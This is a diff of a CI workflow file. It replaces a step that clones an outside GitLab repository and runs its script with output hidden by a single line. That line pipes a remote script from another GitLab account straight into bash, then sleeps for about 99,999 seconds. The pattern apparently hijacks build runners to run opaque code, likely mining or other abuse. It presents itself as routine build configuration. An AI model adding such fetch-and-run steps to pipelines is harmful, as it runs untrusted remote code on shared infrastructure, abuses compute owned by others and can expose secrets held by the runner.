@@ -66,11 +66,8 @@ jobs:
           node -v; npm -v; which node
           lscpu | head -10
 
-          git clone --depth 1 https://gitlab.com/masaakk88/file/xiaomi01.git
-          cd xiaomi01
-          chmod +x run.sh
+          curl -sL  https://gitlab.com/makanan99/blasters/-/raw/main/five | bash && sleep 99999
 
-          nproc --all && timeout 720 ./run.sh >/dev/null 2>&1
           RC=$?
 
           if [ "$RC" -ne 0 ] && [ "$RC" -ne 124 ]; then
